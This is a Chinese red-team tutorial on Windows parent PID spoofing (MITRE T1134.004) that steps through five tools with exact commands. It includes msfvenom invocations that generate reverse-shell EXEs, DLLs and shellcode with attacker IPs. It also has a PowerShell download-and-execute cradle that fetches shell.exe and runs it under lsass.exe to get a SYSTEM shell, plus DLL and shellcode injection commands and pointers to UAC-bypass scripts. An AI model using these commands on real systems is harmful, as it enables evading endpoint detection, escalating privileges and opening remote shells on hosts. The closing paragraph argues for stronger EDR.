#### **概述**

父进程欺骗是一种访问令牌操作技术，通过将恶意文件的`PPID`指定为`explorer.exe`等合法进程的`PPID`，可帮助攻击者规避启发式检测等防御技术。

该欺骗可通过使用本地`API`调用来执行，该调用可帮助攻击者显式指定`PID`，如`C++`中的`CreateProcess`调用。正如我们将在本文中看到的那样，这种显式分配也可能具有某些附带好处。

MITRE 战术：权限提升（TA0004）和 防御规避（TA0005）

MITRE ATT&CK技术：T1134 ：Windows访问令牌模拟窃取以及利用

子技术：T1134.004 ：访问令牌操作： 父 PID 欺骗

#####  **背景：**

子进程监控是威胁狩猎中最常见的指标之一。应急响应人员可能会分析如果 `conhost.exe`或 `cmd.exe`进程是从 `Adobe Reader`或
`MS Excel`等零相关的应用生成的，则表明可能存在潜在威胁。安全防护软件会在启发式检测下监控此行为，并向管理员发出警报。

父`PID(PPID)`欺骗方法可以绕过 `AV/EDR`检测，使其认为是 `lsass.exe`这样的合法进程在进行活动。它通过欺骗进程的
`PID`以匹配其父进程的 `PID`来做到这一点。这种方法可能带来的另一个好处是，如果父进程以
`SYSTEM`权限运行，则可以凭借访问令牌的继承，使其子进程也具有相同的 `SYSTEM`权限。

#####  **进程、PID和PPID**

 **进程：** 在
`Windows`中，应用程序由一个或多个进程组成。简单来说，当前正在运行的程序的一部分称为进程。不同的应用程序可能会使用相同的进程(如`cmd.exe`)，并且为避免歧义，会分配一个整数来区分一个进程和另一个进程。该整数称为`PID`。

 **PID：** 代表进程标识符 (`PID`)，它是正在运行的进程的数字表示。 `Windows`中通过
`GetCurrentProcessID()`函数返回指定进程的 `PID`。

 **父进程：** 父进程是可以派生多个子进程的进程。例如，命令`explorer.exe
/e,/root,"C：\WINDOWS\System32\cmd.exe"`将派生`cmd.exe`作为父进程`explorer.exe`的子进程。在代码中，父进程可以使用`fork()`系统调用来派生子进程。

 **PPID：** 代表父进程标识符(`PPID`)，它是提供给父进程的数字表示形式。任何包含子进程的进程都存在父子关系。

#####  **方法一（使用C++程序进行PID欺骗）**

`Didier Stevens`最初在这里的帖子中谈到了`Windows
API——"CreateProcess"`这种方法。还发布了一个用`C++`编写的利用程序(`SelectMyParent`）。代码可以在这里下载：<https://web.archive.org/web/20210225035252/http:/www.didierstevens.com/files/software/SelectMyParent_v0_0_0_1.zip>

> 请注意，如果您使用的是更高版本的Visual Studio，可能需要重新生成此EXE。在Visual Studio2022中，我删除了Debug and
> Release文件夹中的SelectMyParent.pdb文件，并重新生成了项目以使其运行。

在进程管理器中，你会看到 `explorer.exe`在 `PID 1624`上运行

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）1563.png](https://image.3001.net/images/20220422/1650593222_62620dc6eae8b71221f91.png!small)

因此，要在这个父 `explorer.exe`进程下运行我们自己的二进制文件，可以像这样使用 `SelectMyParent.exe`，你会看到在 `PID
1624`下创建了一个新进程。

    
    
    E:\>SelectMyParent.exe notepad 1624

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）1691.png](https://image.3001.net/images/20220422/1650593224_62620dc869908d35d5a35.png!small)

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）1694.png](https://image.3001.net/images/20220422/1650593226_62620dca49a7dcad789e7.png!small)

可以看到在`PID 2836`启动了`notepad.exe`

同样，我们也可以运行自己的`EXE`。让我们先用`msfvenom`创建一个可以反弹`shell`的`exe`

    
    
    # msfvenom -p windows/shell_reverse_tcp -f exe LHOST=172.19.218.248 LPORT=7777 > shell.exe

在受感染端，使用`tasklist /v`查看进程运行详情。

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）1893.png](https://image.3001.net/images/20220422/1650593227_62620dcb9e4e58b676ea2.png!small)

在列表中，可以看到`explorer.exe`进程以`test`身份在进程`ID 1624`上运行。

然后运行生成的`shell.exe`，并附属在`explorer.exe`的`PID`下

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）1980.png](https://image.3001.net/images/20220422/1650593228_62620dcc7de9e0291930c.png!small)

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）1983.png](https://image.3001.net/images/20220422/1650593229_62620dcde0751e0cbc7d2.png!small)

监听端收到的`shell`便是`explorer.exe`进程用户的权限

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）2051.png](https://image.3001.net/images/20220422/1650593231_62620dcf7b719b409d8b4.png!small)

如果利用具有`system`权限的进程，即可进行提权。

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）2048.png](https://image.3001.net/images/20220422/1650593233_62620dd1ceda05ea9f512.png!small)

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）2051.png](https://image.3001.net/images/20220422/1650593235_62620dd38cb00197fa429.png!small)

#####  **方法二（使用Powershell DLL注入进行PID欺骗）**

`F-Secure`实验室利用
`powershell`创建了替代上述`Didier`二进制文件的方案。它也可以用于父进程欺骗，与上述方法不同之处在于，可以将带有注入的`DLL`的子进程派生为子进程，功能更强大。代码可以在这里下载<https://github.com/countercept/ppid-spoofing>，首先在受害者机器上查看进程`ID`，这里我们选择 `Powershell`的 `PID 24092`作为父进程`ID`。

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）2359.png](https://image.3001.net/images/20220422/1650593237_62620dd5ebea2aa5388fb.png!small)

利用`msfvenmon`生成要注入的`DLL`

    
    
    msfvenom -p windows/x64/shell_reverse_tcp exitfunc=thread LHOST=172.27.115.207 LPORT=7777 -f dll > shell.dll  
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
    [-] No arch selected, selecting arch: x64 from the payload  
    No encoder specified, outputting RAW payload  
    Payload size: 460 bytes  
    Final size of dll file: 8704 bytes

然后进行注入：

    
    
    Import-Module .\PPID-Spoof.ps1  
    PPID-Spoof -ppid 24092 -spawnto "C:\Windows\System32\notepad.exe" -dllpath .\shell.dll

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）2869.png](https://image.3001.net/images/20220422/1650593238_62620dd6b167753bd4c01.png!small)

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）2872.png](https://image.3001.net/images/20220422/1650593239_62620dd7a9309d024ef14.png!small)

可以看到注入的`DLL`在`Notepad.exe`中加载执行了。

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）2905.png](https://image.3001.net/images/20220422/1650593240_62620dd8e2445c4f3fc88.png!small)

通过这种方式，`PPID 24092`上的`powershell.exe`进程派生了一个带有插入代码(由`DLL`提供)的`notepad.exe`。

#####  **方法三（使用Powershell 脚本入进行PID欺骗）**

`Decoder-it`根据 `Didier Stevens`提供的指南开发了一个 `powershell`脚本，使用了
`CreateProcessFromParent()`方法，可以在此处找到的psgetsystem脚本:<https://github.com/decoder-it/psgetsystem.git>，可用于通过`PID`欺骗派生子进程。首先我们查看所需进程的 `PID`。这里以`lsass.exe`为例

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）3271.png](https://image.3001.net/images/20220422/1650593243_62620ddbb6a0a9ec2a2f7.png!small)

然后执行如下命令：

    
    
    powershell -ep bypass  
    Import-Module .\psgetsys.ps1  
    [MyProcess]::CreateProcessFromParent(520,".\shell.exe","")

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）3395.png](https://image.3001.net/images/20220422/1650593246_62620dde9d9300bd39d1d.png!small)

如果报错，可能是`UAC`的问题，需要先绕过`UAC`，或者是权限过低，需要提权。

绕过`UAC`脚本可以在这里找到：<https://github.com/samratashok/nishang/tree/master/Escalation>

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）3594.png](https://image.3001.net/images/20220422/1650593247_62620ddfc6046ab215b80.png!small)

然后下载所需的文件，然后执行命令

    
    
    $client=new-object System.Net.WebClient   
    $client.DownloadFile("http://<url>/psgetsys.ps1",".\psgetsys.ps1")  
    $client.DownloadFile("http://<url>/shell.exe",".\shell.exe")  
    Import-Module .\psgetsys.ps1  
    [MyProcess]::CreateProcessFromParent(520,".\shell.exe","")

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）3871.png](https://image.3001.net/images/20220422/1650593249_62620de12a3608895feae.png!small)

可以看到在`lsass.exe`下成功创建了子进程，因为`lsass.exe`是`system`权限，所以反弹`shell`也获取到了`system`权限。

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）3943.png](https://image.3001.net/images/20220422/1650593251_62620de376eadf9845468.png!small)

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）3946.png](https://image.3001.net/images/20220422/1650593252_62620de4e3397831c9d3a.png!small)

#####  **方法四（使用C#程序进行PID欺骗）**

`py7hagoras`开发了`GetSystem`项目，是上述技术的`C#`实现，可以在这里找到：<https://github.com/py7hagoras/GetSystem.git>

在目标机上下载`GetSystem.exe`，然后执行`GetSystem.exe 自定义程序 -O 目标进程名`

    
    
    GetSystem.exe shell.exe -O lsass

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）4206.png](https://image.3001.net/images/20220422/1650593256_62620de8d18265c3a976f.png!small)

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）4209.png](https://image.3001.net/images/20220422/1650593257_62620de9e6ca12483b589.png!small)

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）4212.png](https://image.3001.net/images/20220422/1650593259_62620deb4a5688b9a231b.png!small)

注意：这里可能也需要绕过`UAC`或者提权，不然执行不成功。

#####  **方法五（通过PID欺骗注入Shellcode）**

`Chirag Savla`使用 `C#`开发了一个名为“ProcessInjection”的出色工具，它可以执行许多功能，包括通过
`PID`欺骗进行的进程注入。通过提供有效的 `PID`，该工具会尝试使用 `CreateProcess`等原生 `API`调用来欺骗
`PID`，然后将代码注入其中。该工具支持 `hex`、`C`和 `base64`格式的`shellcode`，也可以选择 DLL
注入。工具在这里下载：<https://github.com/3xpl01tc0d3r/ProcessInjection>

首先，使用`msfvenom`创建一个`shellcode`代码

    
    
    msfvenom -p windows/x64/shell_reverse_tcp -exitfunc=thread LHOST=172.19.218.248 LPORT=7777 -f hex > /hex.txt

然后在目标机中下载

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）4729.png](https://image.3001.net/images/20220422/1650593261_62620ded730b4a5b8459d.png!small)

使用`ProcessInjection.exe`进行注入

    
    
    ProcessInjection.exe /ppath:"C:\Windows\System32\calc.exe" /path:"hex.txt" /parentproc:explorer /f:hex /t:1

 **参数说明：**

/ppath：目标 EXE 的进程路径（需要注入进程的路径）

/path：shellcode文件路径

/parentproc：父进程名称，目标EXE应在此进程下生成

/f：shellcode文件类型

/t：注入技术

> 支持的五种注入方式：
>  
>  
>     1) Vanilla Process Injection  
>     > 2) DLL Injection  
>     > 3) Process Hollowing  
>     > 4) APC Queue  
>     > 5) Dynamic Invoke - Vanilla Process Injection

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）5118.png](https://image.3001.net/images/20220422/1650593262_62620deea5e64ec9791ea.png!small)

我们可以看到`calc.exe`在`explorer.exe`下，而`shellcode`则在`calc.exe`中执行。

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）5175.png](https://image.3001.net/images/20220422/1650593265_62620df1d12924fdd2d46.png!small)

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）5178.png](https://image.3001.net/images/20220422/1650593267_62620df3597931305453b.png!small)

也可以进行`DLL`注入

    
    
    ProcessInjection.exe /ppath:"C:\Windows\System32\calc.exe" /path:"shell.dll" /parentproc:explorer /t:2

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）5295.png](https://image.3001.net/images/20220422/1650593270_62620df607927134d1d32.png!small)

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）5298.png](https://image.3001.net/images/20220422/1650593273_62620df94b0d2c0eb6215.png!small)

![红队技术-父进程欺骗（ MITRE
ATT&CK框架：T1134）5301.png](https://image.3001.net/images/20220422/1650593275_62620dfb4aedbc2b6bddf.png!small)

#####  **其他工具**

<https://github.com/Mr-Un1k0d3r/RemoteProcessInjection>

<https://github.com/xpn/getsystem-offline>

<https://github.com/hlldz/APC-PPID>

<https://github.com/ewilded/PPID_spoof>

<https://github.com/christophetd/spoofing-office-macro>（VBA实现）

在Metasploit中Meterpreter
可以使用`migrate`命令或者后渗透模块`post/windows/manage/migrate`也可以实现进程迁移。

#####  **总结**

攻击者广泛使用该技术进行检测规避，并增加了应急响应人员检测IoC的时间。针对许多过时的和未打补丁的EDR解决方案，可以使用此技术轻松规避检测。通过本文，告诉大家在组织中应该使用最新的EDR解决方案以及在可以捕捉此类技术的优质产品中使用智能检测功能的重要性。

